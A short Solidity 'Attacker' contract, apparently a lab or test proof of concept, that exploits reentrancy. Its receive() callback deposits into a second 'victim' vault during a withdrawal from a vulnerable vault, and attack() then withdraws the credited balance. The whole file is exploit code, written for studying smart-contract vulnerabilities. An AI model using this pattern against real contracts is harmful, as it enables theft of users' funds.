// SPDX-License-Identifier:  None
pragma solidity 0.8.20;

import "./VictimVault.sol";
import "./VulnVault.sol";

contract Attacker {
    VulnVault public vulnVault;

    VictimVault public victimVault;

    uint256 public counter;

    constructor(address vulnerable_pool, address victim_pool) payable {
        vulnVault = VulnVault(vulnerable_pool);
        victimVault = VictimVault(victim_pool);
        counter = 0;
    }

    function attack() public {
        vulnVault.deposit{value: 1e18}();
        vulnVault.withdraw(1e18);
        uint256 balance = victimVault.balances(address(this));
        victimVault.withdraw(balance);
    }

    receive() external payable {
        if (counter == 0) {
            counter++;
            victimVault.deposit{value: 1e18}();
        }
    }
}
